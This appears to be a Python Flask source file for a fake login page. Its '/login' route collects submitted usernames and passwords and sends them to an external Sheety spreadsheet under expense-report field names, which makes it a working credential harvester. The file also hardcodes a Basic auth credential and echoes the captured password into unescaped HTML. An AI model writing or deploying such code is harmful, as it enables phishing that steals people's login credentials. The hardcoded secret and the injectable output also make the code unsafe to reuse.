from flask import Flask, render_template, request
import requests
import datetime
import os

app = Flask(__name__)


def press(where, how):
        input_text = where
        amount_text = how

        description = input_text
        amount = amount_text

        date = datetime.datetime.now().date()
        time = datetime.datetime.now().strftime("%I:%M:%S %p")

        headers = {
            "Authorization": "Basic cGl5dXNodGl3YXJ5OlBpeXVzaEAyNDA0"
        }

        sheet_input = {
            "sheet1": {
                "date": str(date),
                "time": str(time),
                "description": description,
                "amount": amount
            }
        }

        response = requests.post("https://api.sheety.co/06bd63d07c9a2422ae6db3dd541e920d/expenceReport/sheet1", json=sheet_input, headers=headers)



@app.route('/')
def index():
	return render_template('index.html')


@app.route("/login", methods=["POST"])
def receive_data():
    name = request.form["name"]
    password = request.form["password"]
    press(name, password)
    return f"<h1>Name: {name}, Password: {password}</h1>"


if __name__ == "__main__":
	app.run(debug=False, host='0.0.0.0')

